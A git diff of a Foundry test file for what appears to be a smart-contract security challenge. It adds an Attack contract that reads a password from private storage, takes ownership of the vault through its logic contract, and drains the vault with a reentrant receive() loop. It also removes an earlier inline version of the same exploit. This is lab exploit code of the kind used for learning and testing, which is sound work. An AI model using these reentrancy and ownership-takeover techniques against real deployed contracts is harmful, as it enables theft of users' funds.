@@ -5,23 +5,36 @@ import "forge-std/Test.sol";
 import "../src/Vault.sol";
 import {Test, console} from "forge-std/Test.sol";
 
+contract Attack {
+    address payable public owner;
+    Vault vault;
+
+    constructor(address payable _vault) {
+        owner = payable(msg.sender);
+        vault = Vault(_vault);
+    }
+
+    function attack(bytes32 vault_logic) public {
+        vault.deposite{value: 0.1 ether}();
+        VaultLogic(address(vault)).changeOwner(vault_logic, address(this));
+        vault.openWithdraw();
+        vault.withdraw();
+    }
+
+    receive() external payable {
+        if (address(vault).balance > 0 && msg.sender != owner) {
+            vault.withdraw();
+        }
+    }
+}
+
 contract VaultExploiter is Test {
     Vault public vault;
     VaultLogic public logic;
 
     address owner = address(1);
-    address palyer = address(this);
-    bool ishack = false;
+    address palyer = address(2);
     event Received(address Sender, uint Value);
-
-    // 接收ETH时释放Received事件
-    receive() external payable {
-        emit Received(msg.sender, msg.value);
-        if (ishack == false) {
-            ishack = true;
-            vault.withdraw();
-        }
-    }
 
     function setUp() public {
         vm.deal(owner, 1 ether);
@@ -43,12 +56,10 @@ contract VaultExploiter is Test {
             address(vault),
             0x0000000000000000000000000000000000000000000000000000000000000001
         );
-        console.logBytes32(password);
-        vault.deposite{value: 0.1 ether}();
-
-        VaultLogic(address(vault)).changeOwner(password, palyer);
-        vault.openWithdraw();
-        vault.withdraw();
+        Attack attack = new Attack(payable(address(vault)));
+        (bool success, ) = payable(address(attack)).call{value: 0.1 ether}("");
+        require(success, "transfer failed");
+        attack.attack(password);
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
